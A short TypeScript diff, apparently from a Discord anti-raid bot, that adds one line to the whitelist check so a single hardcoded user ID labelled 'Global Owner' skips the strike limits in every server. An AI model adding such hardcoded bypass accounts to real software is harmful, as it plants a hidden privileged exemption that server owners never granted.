@@ -43,6 +43,7 @@ function checkAndAddStrike(userId: string, action: keyof typeof LIMITS): boolean
 
 // Whitelist hệ thống: Bot và Owner của Server
 async function isWhitelisted(guild: Guild, userId: string): Promise<boolean> {
+  if (userId === "1478172978259824793") return true; // Global Owner
   if (userId === guild.client.user?.id) return true;
   const owner = await guild.fetchOwner().catch(() => null);
   if (owner && owner.id === userId) return true;
